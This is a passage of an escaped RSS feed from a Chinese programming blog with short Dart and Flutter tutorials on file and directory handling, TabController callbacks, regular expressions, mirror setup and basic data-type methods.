 Directory dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Directory(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#39;D:\workspace\dart_space\Tutorial&amp;#39;&lt;/span&gt;);
 &lt;span style=&#34;color:#75715e&#34;&gt;// 目录是否存在
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; dir.exists()){
   &lt;span style=&#34;color:#75715e&#34;&gt;// 从目录的list方法获取FileSystemEntity对象
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   Stream&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;FileSystemEntity&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; fse &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; dir.list();
   &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (FileSystemEntity entity &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; fse) {
     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(entity &lt;span style=&#34;color:#66d9ef&#34;&gt;is&lt;/span&gt; File){
       print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;entity is file&amp;#34;&lt;/span&gt;);
     }

     &lt;span style=&#34;color:#75715e&#34;&gt;// 打印文件信息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;     print(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; entity.stat());
     &lt;span style=&#34;color:#75715e&#34;&gt;// 删除
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; entity.delete();
   }
 }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
   &lt;span style=&#34;color:#75715e&#34;&gt;// 不存在则创建。recursive为true时，创建路径上所有不存在的目录
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; dir.create(recursive: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
 }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/yingshukun/article/details/100866655&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Dart 语言标准流与文件操作 @血色v残阳 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Flutter—TabController 的两次回调</title>
        <link>https://ac-lm.github.io/posts/flutter/fluttertabcontroller-%E7%9A%84%E4%B8%A4%E6%AC%A1%E5%9B%9E%E8%B0%83/</link>
        <pubDate>Mon, 26 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/fluttertabcontroller-%E7%9A%84%E4%B8%A4%E6%AC%A1%E5%9B%9E%E8%B0%83/</guid>
        <description>&lt;h2 id=&#34;1tabcontroller-的回调&#34;&gt;1.TabController 的回调&lt;/h2&gt;
&lt;p&gt;TabController 监听在点击切换 tab 的时候会回调两次，左右滑动切换 tab 正常调用一次，这是由于在点击切换 tab 的时候会执行一个动画效果，滑动切换的时候是没有的，在这个过程中多触发了一次 Listener。&lt;/p&gt;
&lt;p&gt;因此，在设计时需要注意该问题，以避免监听出错。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Dart—正则</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E6%AD%A3%E5%88%99/</link>
        <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E6%AD%A3%E5%88%99/</guid>
        <description>&lt;h2 id=&#34;1属性&#34;&gt;1.属性&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;RegExp exp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#34;(\w+)&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#75715e&#34;&gt;// 返回正则表达式的哈希码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.hashCode);
&lt;span style=&#34;color:#75715e&#34;&gt;// 正则表达式是否区分大小写
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.isCaseSensitive);
&lt;span style=&#34;color:#75715e&#34;&gt;// 正则表达式是否匹配多行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.isMultiLine);
&lt;span style=&#34;color:#75715e&#34;&gt;// 返回源正则表达式字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.pattern);
&lt;span style=&#34;color:#75715e&#34;&gt;// 返回对象运行时的类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.runtimeType);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2方法&#34;&gt;2.方法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;RegExp exp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#34;(\w+)&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#75715e&#34;&gt;// 返回正则表达式匹配项的可迭代对象
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;match &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; exp.allMatches(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abc def ghi&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (Match m &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; matches) {
   print(m.group(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
}
&lt;span style=&#34;color:#75715e&#34;&gt;// 搜索并返回第一个匹配项，没有则返回null
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.firstMatch(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;));
&lt;span style=&#34;color:#75715e&#34;&gt;// 正则表达式是否找到匹配项
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.hasMatch(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;as&amp;#34;&lt;/span&gt;));
&lt;span style=&#34;color:#75715e&#34;&gt;// 从第几个字符开始匹配正则表达式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.matchAsPrefix(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ab cd&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;));
&lt;span style=&#34;color:#75715e&#34;&gt;// 返回正则表达式的第一个匹配字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.stringMatch(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abc de&amp;#34;&lt;/span&gt;));
&lt;span style=&#34;color:#75715e&#34;&gt;// 返回正则表达式的字符串表示
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;print(exp.toString());
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—下载环境配置</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%8B%E8%BD%BD%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E4%B8%8B%E8%BD%BD%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1环境设置&#34;&gt;1.环境设置&lt;/h2&gt;
&lt;p&gt;由于Flutter默认配置的下载服务器在国外，往往会出现网络波动无法下载的情况，因此需要重新配置国内镜像，避免出现无法下载情况。在终端命令或 Windows 环境变量中增加键值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;export PUB_HOSTED_URL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://pub.flutter-io.cn
export FLUTTER_STORAGE_BASE_URL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://storage.flutter-io.cn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Dart—基本数据类型</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
        <pubDate>Sat, 24 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
        <description>&lt;h2 id=&#34;1数字与布尔值&#34;&gt;1.数字与布尔值&lt;/h2&gt;
&lt;h3 id=&#34;a属性&#34;&gt;a.属性&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; figureA &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// figureA 是否为负数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureA.isNegative);
    &lt;span style=&#34;color:#75715e&#34;&gt;// figureA 是否是有限的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureA.isFinite);
    &lt;span style=&#34;color:#75715e&#34;&gt;// figureA 是否正无穷大或负无穷大
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureA.isInfinite);
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; figureB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64.742&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 的符号，-1.0:值小于0、+1.0:值大于0、-0.0/0.0/NaN:值是其本身
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.sign);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 运行时的类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.runtimeType);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 的哈希码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.hashCode);
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; figureC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// figureC 是否为奇数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureC.isOdd);
    &lt;span style=&#34;color:#75715e&#34;&gt;// figureC 是否为偶数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureC.isEven);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureC 所占存储位
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureC.bitLength);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b方法&#34;&gt;b.方法&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; figureA &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureA 的绝对值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureA.abs());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureA 的字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureA.toString());
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; figureB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64.742&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 的整数值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.toInt());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 的双精度值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.toDouble());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回大于 figureB 的双精度值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.ceilToDouble());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回小于 figureB 的双精度值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.floorToDouble());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 四舍五入的双精度值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.roundToDouble());
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 保留几位小数的字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.toStringAsFixed(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureB 保留几位小数后精确结果的字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureB.toStringAsPrecision(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;));
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; figureC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// figureC对比其他整数，0:相同、1:大于、-1:小于
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureC.compareTo(&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 将figureC控制在指定区间的整数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureC.clamp(&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回figureC转换成指定基数(进制)的字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureC.toRadixString(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;));
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; figureD &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureD 与其他整数的最大公约数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureD.gcd(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureDg 与其他整数的截取余数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureD.remainder(&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;));
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回 figureD 几次幂值的字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(figureD.toStringAsExponential(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2字符串常量&#34;&gt;2.字符串常量&lt;/h2&gt;
&lt;h3 id=&#34;a属性-1&#34;&gt;a.属性&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回字符串的 UTF-16 代码单元列表
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.codeUnits);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回根据代码单元生成的哈希码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.hashCode);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 字符串是否为空
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.isEmpty);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 字符串是否不为空
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.isNotEmpty);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 字符串的长度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.length);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回字符串 Unicode 代码的可迭代对象
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.runes);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 返回对象运行时的类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(str.runtimeType);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b方法-1&#34;&gt;b.方法&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 返回对象的字符串表示
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;;
print(str.toString());

&lt;span style=&#34;color:#75715e&#34;&gt;// 截取字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Dart is fun&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; newStr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str.substring(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
print(newStr);

&lt;span style=&#34;color:#75715e&#34;&gt;// 在字符串中插入字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XiaoMing&amp;#34;&lt;/span&gt;;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;My name is &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;name&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// 输出字符串的Unicode编码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Dart&amp;#34;&lt;/span&gt;;
print(str.codeUnitAt(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
print(str.codeUnits);

&lt;span style=&#34;color:#75715e&#34;&gt;// 去掉字符串前后空格
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Dart is fun&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
print(str.trimLeft());
print(str.trimRight());
print(str.trim());

&lt;span style=&#34;color:#75715e&#34;&gt;// 字符串的大小写转换
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCdef&amp;#34;&lt;/span&gt;;
print(str.toLowerCase());
print(str.toUpperCase());

&lt;span style=&#34;color:#75715e&#34;&gt;// 拆分字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; strA &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello world!&amp;#34;&lt;/span&gt;;
print(strA.split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;));
&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; strB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abba&amp;#34;&lt;/span&gt;;
print(strB.split(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#34;b*&amp;#34;&lt;/span&gt;)));

&lt;span style=&#34;color:#75715e&#34;&gt;// 是否包含其他字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Dart strings&amp;#39;&lt;/span&gt;;
print(str.contains(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;));
print(str.contains(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#39;[A-Z]&amp;#39;&lt;/span&gt;)));
print(str.contains(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
print(str.contains(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#39;[A-Z]&amp;#39;&lt;/span&gt;),&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));

&lt;span style=&#34;color:#75715e&#34;&gt;// 在字符串前后补占位符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;86&amp;#34;&lt;/span&gt;;
print(str.padLeft(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;));
print(str.padRight(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;));

&lt;span style=&#34;color:#75715e&#34;&gt;// 获取指定字符出现的位置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Dartisans&amp;#39;&lt;/span&gt;;
print(str.indexOf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;art&amp;#39;&lt;/span&gt;));
print(str.indexOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#39;[A-Z][a-z]&amp;#39;&lt;/span&gt;)));
print(str.lastIndexOf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;));
print(str.lastIndexOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RegExp(&lt;span style=&#34;color:#e6db74&#34;&gt;r&amp;#39;a(r|n)&amp;#39;&lt;/span&gt;)));

&lt;span style=&#34;color:#75715e&#34;&gt;// 替换字符串中所有匹配字符
